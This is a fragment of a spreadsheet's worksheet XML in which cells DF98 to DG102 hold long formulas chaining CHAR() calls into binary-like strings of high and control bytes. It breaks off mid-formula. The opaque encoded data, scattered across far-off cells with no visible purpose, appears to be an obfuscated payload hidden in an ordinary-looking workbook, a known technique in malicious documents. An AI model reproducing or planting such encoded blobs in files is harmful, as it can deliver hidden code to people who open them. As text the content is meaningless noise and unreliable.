        <f>CHAR(89)&amp;CHAR(83)&amp;CHAR(249)&amp;CHAR(178)&amp;CHAR(170)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(202)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(205)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(85)&amp;CHAR(156)&amp;CHAR(132)&amp;CHAR(157)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(111)&amp;CHAR(4)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(137)&amp;CHAR(121)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(148)&amp;CHAR(191)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(2)&amp;CHAR(131)&amp;CHAR(163)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(90)&amp;CHAR(40)&amp;CHAR(20)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(24)&amp;CHAR(92)&amp;CHAR(128)&amp;CHAR(136)&amp;CHAR(182)&amp;CHAR(10)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(113)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(66)&amp;CHAR(245)&amp;CHAR(21)&amp;CHAR(143)&amp;CHAR(197)&amp;CHAR(126)&amp;CHAR(114)&amp;CHAR(130)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(86)&amp;CHAR(130)&amp;CHAR(15)&amp;CHAR(250)&amp;CHAR(64)&amp;CHAR(11)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(126)&amp;CHAR(90)&amp;CHAR(137)&amp;CHAR(73)&amp;CHAR(35)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(94)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(142)&amp;CHAR(69)&amp;CHAR(33)&amp;CHAR(54)&amp;CHAR(85)&amp;CHAR(66)&amp;CHAR(142)&amp;CHAR(3)&amp;CHAR(251)&amp;CHAR(82)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(114)&amp;CHAR(75)&amp;CHAR(134)&amp;CHAR(138)&amp;CHAR(206)&amp;CHAR(21)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(82)&amp;CHAR(249)&amp;CHAR(92)&amp;CHAR(124)&amp;CHAR(135)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(26)&amp;CHAR(133)&amp;CHAR(252)&amp;CHAR(108)&amp;CHAR(35)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(152)&amp;CHAR(27)&amp;CHAR(248)&amp;CHAR(88)&amp;CHAR(37)&amp;CHAR(92)&amp;CHAR(142)&amp;CHAR(249)&amp;CHAR(254)&amp;CHAR(81)&amp;CHAR(113)&amp;CHAR(53)&amp;CHAR(246)&amp;CHAR(130)&amp;CHAR(243)&amp;CHAR(100)&amp;CHAR(36)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(17)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(80)&amp;CHAR(152)&amp;CHAR(15)&amp;CHAR(93)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(80)&amp;CHAR(94)&amp;CHAR(80)&amp;CHAR(86)&amp;CHAR(248)&amp;CHAR(66)&amp;CHAR(17)&amp;CHAR(135)&amp;CHAR(196)&amp;CHAR(119)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(97)&amp;CHAR(11)&amp;CHAR(82)&amp;CHAR(157)&amp;CHAR(4)&amp;CHAR(251)&amp;CHAR(83)&amp;CHAR(18)&amp;CHAR(132)&amp;CHAR(72)&amp;CHAR(40)&amp;CHAR(25)&amp;CHAR(91)&amp;CHAR(129)&amp;CHAR(6)&amp;CHAR(251)&amp;CHAR(87)&amp;CHAR(41)&amp;CHAR(137)&amp;CHAR(69)&amp;CHAR(55)&amp;CHAR(26)&amp;CHAR(87)&amp;CHAR(129)&amp;CHAR(13)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(89)&amp;CHAR(140)&amp;CHAR(13)&amp;CHAR(238)&amp;CHAR(86)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(158)&amp;CHAR(3)&amp;CHAR(79)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(81)&amp;CHAR(82)&amp;CHAR(251)&amp;CHAR(16)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(201)&amp;CHAR(10)&amp;CHAR(111)&amp;CHAR(3)&amp;CHAR(203)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(65)&amp;CHAR(89)&amp;CHAR(251)&amp;CHAR(81)&amp;CHAR(70)&amp;CHAR(80)&amp;CHAR(82)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(138)</f>
        <v>YSù²ª_x0001__x0013_
‚Ê
ŽÍ	_x0001__x0002_ˆB-_x0017_Uœ„_x0006__x000B__x0005_Ro_x0004_DŠ‰y_x0001__x0007_	Uù”¿_x0005__x0002__x0004_‡Ê_x0002_ƒ£_x0003__x000B_	‰Z(_x0014_B+_x0018_\€ˆ¶
_x0004__x0006_q‰_x0010_Bõ_x0015_Å~r‚E&amp;_x0011_V‚_x000F_ú@_x000B_„Â~Z‰I#_x0003_Š^!_x001D_ŽE!6UBŽ_x0003_ûR_x0006_ˆÆrK†ŠÎ_x0015__x000C__x0004_Rù\|‡A/_x001A_…ül#UP˜_x001B_øX%\ŽùþQq5ö‚ód$ŠF/_x0011_URP˜_x000F_]RRP^PVøB_x0011_‡Äw_x0006_†B#_x0013_a_x000B_R_x0004_ûS_x0012_„H(_x0019_[_x0006_ûW)‰E7_x001A_W_x000D_ôT_x0015_ŠF!_x0016_YŒ_x000D_îV	‰ˆE_x0005__x0005__x0007_ž_x0003_O_x0007__x0005__x0007_	UQRû_x0010__x0006__x0004__x0002_‰É
o_x0003_Ë	_x0002_AYûQFPRQVŠ</v>
      </c>
      <c r="DG98" t="str">
        <f>CHAR(65)&amp;CHAR(120)&amp;CHAR(186)&amp;CHAR(53)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(206)&amp;CHAR(73)&amp;CHAR(188)</f>
        <v>Axº5R×ÕÎI¼</v>
      </c>
    </row>
    <row r="99" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF99" t="str">
        <f>CHAR(206)&amp;CHAR(214)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(255)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(95)&amp;CHAR(83)&amp;CHAR(128)&amp;CHAR(113)&amp;CHAR(45)&amp;CHAR(29)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(184)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(188)&amp;CHAR(67)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(17)&amp;CHAR(140)&amp;CHAR(53)&amp;CHAR(142)&amp;CHAR(131)&amp;CHAR(71)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(52)&amp;CHAR(254)&amp;CHAR(111)&amp;CHAR(6)&amp;CHAR(108)&amp;CHAR(2)&amp;CHAR(58)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(7)&amp;CHAR(78)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(84)&amp;CHAR(87)&amp;CHAR(249)&amp;CHAR(89)&amp;CHAR(48)&amp;CHAR(135)&amp;CHAR(213)&amp;CHAR(142)&amp;CHAR(209)&amp;CHAR(1)&amp;CHAR(128)&amp;CHAR(215)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(152)&amp;CHAR(133)&amp;CHAR(23)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(192)&amp;CHAR(80)&amp;CHAR(81)&amp;CHAR(111)&amp;CHAR(249)&amp;CHAR(132)&amp;CHAR(136)&amp;CHAR(29)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(83)&amp;CHAR(94)&amp;CHAR(80)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(87)&amp;CHAR(70)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(147)&amp;CHAR(173)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(131)&amp;CHAR(199)&amp;CHAR(28)&amp;CHAR(128)&amp;CHAR(133)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(91)&amp;CHAR(132)&amp;CHAR(132)&amp;CHAR(250)&amp;CHAR(8)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(86)&amp;CHAR(101)&amp;CHAR(13)&amp;CHAR(89)&amp;CHAR(128)&amp;CHAR(141)&amp;CHAR(214)&amp;CHAR(10)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(113)&amp;CHAR(253)&amp;CHAR(151)&amp;CHAR(191)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(104)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(132)&amp;CHAR(83)&amp;CHAR(33)&amp;CHAR(49)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(13)&amp;CHAR(253)&amp;CHAR(148)&amp;CHAR(3)&amp;CHAR(18)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(197)&amp;CHAR(114)&amp;CHAR(73)&amp;CHAR(99)&amp;CHAR(63)&amp;CHAR(107)&amp;CHAR(55)&amp;CHAR(37)&amp;CHAR(118)&amp;CHAR(61)&amp;CHAR(137)&amp;CHAR(70)&amp;CHAR(41)&amp;CHAR(22)&amp;CHAR(138)&amp;CHAR(71)&amp;CHAR(47)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(155)&amp;CHAR(138)&amp;CHAR(248)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(92)&amp;CHAR(135)&amp;CHAR(28)&amp;CHAR(90)&amp;CHAR(245)&amp;CHAR(28)&amp;CHAR(129)&amp;CHAR(198)&amp;CHAR(84)&amp;CHAR(34)&amp;CHAR(138)&amp;CHAR(87)&amp;CHAR(46)&amp;CHAR(23)&amp;CHAR(135)&amp;CHAR(81)&amp;CHAR(47)&amp;CHAR(29)&amp;CHAR(91)&amp;CHAR(254)&amp;CHAR(118)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(130)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(238)&amp;CHAR(150)&amp;CHAR(141)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(7)&amp;CHAR(87)&amp;CHAR(129)&amp;CHAR(13)&amp;CHAR(250)&amp;CHAR(86)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(3)&amp;CHAR(85)&amp;CHAR(137)&amp;CHAR(12)&amp;CHAR(253)&amp;CHAR(91)&amp;CHAR(5)&amp;CHAR(249)&amp;CHAR(145)&amp;CHAR(179)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(157)&amp;CHAR(138)&amp;CHAR(68)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(129)&amp;CHAR(8)&amp;CHAR(72)</f>
        <v>ÎÖ_x0004__x0006_!Á‚ÿ_x0006_T_S€q-_x001D_U†¸_x0005__x0002__x0005__x0011__x0006_Œ¼C_x0002__x0002__x0005_s_x0011_Œ5ŽƒG_x000E__x0005__x0006_4þo_x0006_l_x0002_:_x000D__x0006_Š_x0007_N_x000B__x0002__x0016__x000C_TWùY0‡ÕŽÑ_x0001_€×!_x0002__x0001_˜…_x0017__x0013__x0005__x000B__x0006_ÀPQoù„ˆ_x001D__x0008__x0007__x0001_S^PýSWFRõ“­_x0007_	_x0005_ƒÇ_x001C_€…_x0004__x0002_
€B#_x0013_[„„ú_x0008__x0004__x0002_Ve_x000D_Y€Ö
_x0004__x0006_qý—¿
_x0007_
€ËphŠF!_x0016_„S!1URR€_x000D_ý”_x0003__x0012__x0007_
€ÅrIc?k7%v=‰F)_x0016_ŠG/_x001D_R›Šø_x0006__x0006__x000F_\‡_x001C_Zõ_x001C_ÆT"ŠW._x0017_‡Q/_x001D_[þv!_x001E_‚_x000F_Uî–_x0002__x000B__x0005_‰A#_x0007_W_x000D_úV_x0001_ŽB#_x0003_U‰_x000C_ý[_x0005_ù‘³_x000B_	_x0002_ŠD_x0005__x0006__x000F__x0008_H</v>
      </c>
      <c r="DG99" t="str">
        <f>CHAR(199)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(13)&amp;CHAR(202)&amp;CHAR(25)&amp;CHAR(211)&amp;CHAR(150)</f>
        <v>ÇUÙ×_x000D_Ê_x0019_Ó–</v>
      </c>
    </row>
    <row r="100" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF100" t="str">
        <f>CHAR(9)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(86)&amp;CHAR(116)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(235)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(207)&amp;CHAR(9)&amp;CHAR(97)&amp;CHAR(1)&amp;CHAR(194)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(92)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(71)&amp;CHAR(71)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(86)&amp;CHAR(94)&amp;CHAR(129)&amp;CHAR(193)&amp;CHAR(11)&amp;CHAR(208)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(9)&amp;CHAR(192)&amp;CHAR(9)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(54)&amp;CHAR(194)&amp;CHAR(198)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(7)&amp;CHAR(32)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(207)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(11)&amp;CHAR(149)&amp;CHAR(251)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(2)&amp;CHAR(205)&amp;CHAR(236)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(75)&amp;CHAR(137)&amp;CHAR(239)&amp;CHAR(15)&amp;CHAR(198)&amp;CHAR(94)&amp;CHAR(142)&amp;CHAR(229)&amp;CHAR(101)&amp;CHAR(163)&amp;CHAR(53)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(54)&amp;CHAR(216)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(66)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(114)&amp;CHAR(9)&amp;CHAR(236)&amp;CHAR(51)&amp;CHAR(130)&amp;CHAR(195)&amp;CHAR(112)&amp;CHAR(38)&amp;CHAR(248)&amp;CHAR(124)&amp;CHAR(29)&amp;CHAR(249)&amp;CHAR(114)&amp;CHAR(7)&amp;CHAR(250)&amp;CHAR(119)&amp;CHAR(20)&amp;CHAR(253)&amp;CHAR(127)&amp;CHAR(1)&amp;CHAR(86)&amp;CHAR(248)&amp;CHAR(118)&amp;CHAR(3)&amp;CHAR(225)&amp;CHAR(142)&amp;CHAR(251)&amp;CHAR(243)&amp;CHAR(251)&amp;CHAR(137)&amp;CHAR(48)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(20)&amp;CHAR(134)&amp;CHAR(195)&amp;CHAR(129)&amp;CHAR(72)&amp;CHAR(28)&amp;CHAR(131)&amp;CHAR(225)&amp;CHAR(119)&amp;CHAR(216)&amp;CHAR(152)&amp;CHAR(203)&amp;CHAR(89)&amp;CHAR(87)&amp;CHAR(198)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(9)&amp;CHAR(84)&amp;CHAR(142)&amp;CHAR(114)&amp;CHAR(45)&amp;CHAR(15)&amp;CHAR(143)&amp;CHAR(7)&amp;CHAR(131)&amp;CHAR(211)&amp;CHAR(118)&amp;CHAR(31)&amp;CHAR(143)&amp;CHAR(200)&amp;CHAR(46)&amp;CHAR(247)&amp;CHAR(153)&amp;CHAR(214)&amp;CHAR(48)&amp;CHAR(13)&amp;CHAR(112)&amp;CHAR(13)&amp;CHAR(73)&amp;CHAR(143)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(153)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(205)&amp;CHAR(119)&amp;CHAR(250)&amp;CHAR(2)&amp;CHAR(176)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(189)&amp;CHAR(203)&amp;CHAR(41)&amp;CHAR(215)&amp;CHAR(82)&amp;CHAR(199)&amp;CHAR(129)&amp;CHAR(234)&amp;CHAR(27)&amp;CHAR(95)&amp;CHAR(135)&amp;CHAR(81)&amp;CHAR(47)&amp;CHAR(42)&amp;CHAR(61)&amp;CHAR(196)&amp;CHAR(83)&amp;CHAR(170)&amp;CHAR(110)&amp;CHAR(37)&amp;CHAR(59)&amp;CHAR(92)&amp;CHAR(80)&amp;CHAR(57)&amp;CHAR(250)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(45)&amp;CHAR(49)&amp;CHAR(243)&amp;CHAR(143)&amp;CHAR(125)&amp;CHAR(35)&amp;CHAR(21)&amp;CHAR(154)&amp;CHAR(75)&amp;CHAR(37)&amp;CHAR(42)&amp;CHAR(129)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(206)&amp;CHAR(103)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(253)&amp;CHAR(69)&amp;CHAR(115)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(74)&amp;CHAR(59)&amp;CHAR(7)&amp;CHAR(66)&amp;CHAR(66)&amp;CHAR(141)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(80)&amp;CHAR(105)&amp;CHAR(27)&amp;CHAR(81)&amp;CHAR(41)&amp;CHAR(209)&amp;CHAR(129)&amp;CHAR(112)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(95)&amp;CHAR(15)&amp;CHAR(251)</f>
        <v xml:space="preserve">	
_x000E__x0004_VtQéë_x0008__x0007_
†Ï	a_x0001_Â_x0005__x0006_\TúGG^\V^Á_x000B_ÐŒN!	À	_x0004__x0006__x0007__x0013_6ÂÆ_x0012_
†B#_x0007_ M&amp;_x001E_ÏF"_x000B_•ûq/_x0002_Íì_x0006_!_x0002__x0001_K‰ï_x000F_Æ^Žåe£5_x0006_	_x0007_6ØQŠB_x0007_Žr	ì3‚Ãp&amp;ø|_x001D_ùr_x0007_úw_x0014_ý_x0001_Vøv_x0003_áŽûóû‰0ŒÈ_x0014_†ÃH_x001C_ƒáwØ˜ËYWÆ€A-	TŽr-_x000F__x0007_ƒÓv_x001F_È.÷™Ö0_x000D_p_x000D_I
_x0001_™Ô†Íwú_x0002_°_x000F__x000C_½Ë)×RÇê_x001B__‡Q/*=ÄSªn%;\P9ú‚A--1ó}#_x0015_šK%*	
Îg_x0016_‰ýEs_x0005_J;_x0007_BBF.!íPi_x001B_Q)Ñp&amp;_x0012___x000F_û</v>
      </c>
      <c r="DG100" t="str">
        <f>CHAR(94)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(147)&amp;CHAR(191)</f>
        <v>^òý†Ê|Öž“¿</v>
      </c>
    </row>
    <row r="101" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF101" t="str">
        <f>CHAR(103)&amp;CHAR(11)&amp;CHAR(92)&amp;CHAR(230)&amp;CHAR(249)&amp;CHAR(7)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(215)&amp;CHAR(6)&amp;CHAR(193)&amp;CHAR(12)&amp;CHAR(133)&amp;CHAR(136)&amp;CHAR(250)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(35)&amp;CHAR(80)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(29)&amp;CHAR(66)&amp;CHAR(87)&amp;CHAR(233)&amp;CHAR(92)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(111)&amp;CHAR(23)&amp;CHAR(32)&amp;CHAR(223)&amp;CHAR(57)&amp;CHAR(239)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(45)&amp;CHAR(33)&amp;CHAR(108)&amp;CHAR(7)&amp;CHAR(67)&amp;CHAR(237)&amp;CHAR(214)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(194)&amp;CHAR(31)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(45)&amp;CHAR(46)&amp;CHAR(157)&amp;CHAR(120)&amp;CHAR(32)&amp;CHAR(18)&amp;CHAR(199)&amp;CHAR(239)&amp;CHAR(15)&amp;CHAR(74)&amp;CHAR(103)&amp;CHAR(27)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(32)&amp;CHAR(34)&amp;CHAR(126)&amp;CHAR(139)&amp;CHAR(117)&amp;CHAR(55)&amp;CHAR(26)&amp;CHAR(132)&amp;CHAR(245)&amp;CHAR(21)&amp;CHAR(126)&amp;CHAR(16)&amp;CHAR(92)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(237)&amp;CHAR(48)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(193)&amp;CHAR(14)&amp;CHAR(54)&amp;CHAR(223)&amp;CHAR(32)&amp;CHAR(237)&amp;CHAR(57)&amp;CHAR(250)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(45)&amp;CHAR(41)&amp;CHAR(131)&amp;CHAR(241)&amp;CHAR(28)&amp;CHAR(129)&amp;CHAR(101)&amp;CHAR(251)&amp;CHAR(253)&amp;CHAR(245)&amp;CHAR(82)&amp;CHAR(88)&amp;CHAR(140)&amp;CHAR(214)&amp;CHAR(128)&amp;CHAR(202)&amp;CHAR(95)&amp;CHAR(77)&amp;CHAR(143)&amp;CHAR(192)&amp;CHAR(22)&amp;CHAR(197)&amp;CHAR(140)&amp;CHAR(224)&amp;CHAR(28)&amp;CHAR(134)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(82)&amp;CHAR(5)&amp;CHAR(30)&amp;CHAR(82)&amp;CHAR(70)&amp;CHAR(92)&amp;CHAR(140)&amp;CHAR(126)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(54)&amp;CHAR(210)&amp;CHAR(86)&amp;CHAR(143)&amp;CHAR(121)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(162)&amp;CHAR(160)&amp;CHAR(180)&amp;CHAR(162)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(47)&amp;CHAR(17)&amp;CHAR(137)&amp;CHAR(113)&amp;CHAR(35)&amp;CHAR(15)&amp;CHAR(140)&amp;CHAR(102)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(140)&amp;CHAR(117)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(142)&amp;CHAR(95)&amp;CHAR(33)&amp;CHAR(42)&amp;CHAR(143)&amp;CHAR(204)&amp;CHAR(203)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(140)&amp;CHAR(119)&amp;CHAR(47)&amp;CHAR(33)&amp;CHAR(1)&amp;CHAR(212)&amp;CHAR(205)&amp;CHAR(202)&amp;CHAR(10)&amp;CHAR(53)&amp;CHAR(200)&amp;CHAR(15)&amp;CHAR(251)&amp;CHAR(204)&amp;CHAR(201)&amp;CHAR(9)&amp;CHAR(61)&amp;CHAR(247)&amp;CHAR(199)&amp;CHAR(230)&amp;CHAR(1)&amp;CHAR(50)&amp;CHAR(195)&amp;CHAR(131)&amp;CHAR(107)&amp;CHAR(46)&amp;CHAR(45)&amp;CHAR(56)&amp;CHAR(251)&amp;CHAR(130)&amp;CHAR(232)&amp;CHAR(65)&amp;CHAR(134)&amp;CHAR(253)&amp;CHAR(18)&amp;CHAR(117)&amp;CHAR(211)&amp;CHAR(78)&amp;CHAR(89)&amp;CHAR(92)&amp;CHAR(89)&amp;CHAR(136)&amp;CHAR(193)&amp;CHAR(18)&amp;CHAR(198)&amp;CHAR(140)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(26)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(19)&amp;CHAR(90)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(35)&amp;CHAR(55)&amp;CHAR(128)&amp;CHAR(208)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(226)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(45)&amp;CHAR(34)&amp;CHAR(67)&amp;CHAR(63)&amp;CHAR(233)&amp;CHAR(71)&amp;CHAR(80)&amp;CHAR(130)&amp;CHAR(68)</f>
        <v>g_x000B_\æù_x0007_!_x0002_‚×_x0006_Á_x000C_…ˆú_x0005_s#P‹M#_x001D_BWé\_x000B__x0005__x0002_o_x0017_ ß9ïˆC-!l_x0007_CíÖ_x0005__x0002_
ŽÂ_x001F_ˆO-.x _x0012_Çï_x000F_Jg_x001B_ƒJ "~‹u7_x001A_„õ_x0015_~_x0010_\ŒF!_x001E_ZWí0_x0007__x0001__x0002_ˆÁ_x000E_6ß í9úŽC-)ƒñ_x001C_eûýõRXŒÖ€Ê_MÀ_x0016_ÅŒà_x001C_†O._x0016_R_x0005__x001E_RF\Œ~!+6ÒVy"_x0019_¢ ´¢ŠN/_x0011_‰q#_x000F_Œf!_x001D_Œu!_x0016_Ž_!*ÌËÅ_x000E_Œw/!_x0001_ÔÍÊ
5È_x000F_ûÌÉ	=÷Çæ_x0001_2Ãƒk.-8û‚èA†ý_x0012_uÓNY\YˆÁ_x0012_ÆŒG#_x001A_†é_x0013_ZŽZ#7€Ð_x000B_†â_x000D__x0006__x0007_ˆO-"C?éGP‚D</v>
      </c>
      <c r="DG101" t="str">
        <f>CHAR(153)&amp;CHAR(11)&amp;CHAR(207)&amp;CHAR(65)&amp;CHAR(155)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(88)&amp;CHAR(147)</f>
        <v>™_x000B_ÏA›_x001D_RŸX“</v>
      </c>
    </row>
    <row r="102" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF102" t="str">
        <f>CHAR(3)&amp;CHAR(38)&amp;CHAR(227)&amp;CHAR(93)&amp;CHAR(135)&amp;CHAR(72)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(139)&amp;CHAR(109)&amp;CHAR(55)&amp;CHAR(62)&amp;CHAR(140)&amp;CHAR(250)&amp;CHAR(136)&amp;CHAR(119)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(50)&amp;CHAR(203)&amp;CHAR(160)&amp;CHAR(163)&amp;CHAR(172)&amp;CHAR(162)&amp;CHAR(142)&amp;CHAR(101)&amp;CHAR(35)&amp;CHAR(41)&amp;CHAR(137)&amp;CHAR(15)&amp;CHAR(139)&amp;CHAR(51)&amp;CHAR(65)&amp;CHAR(139)&amp;CHAR(7)&amp;CHAR(70)&amp;CHAR(137)&amp;CHAR(252)&amp;CHAR(1)&amp;CHAR(117)&amp;CHAR(250)&amp;CHAR(142)&amp;CHAR(114)&amp;CHAR(35)&amp;CHAR(51)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(32)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(31)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(209)&amp;CHAR(72)&amp;CHAR(32)&amp;CH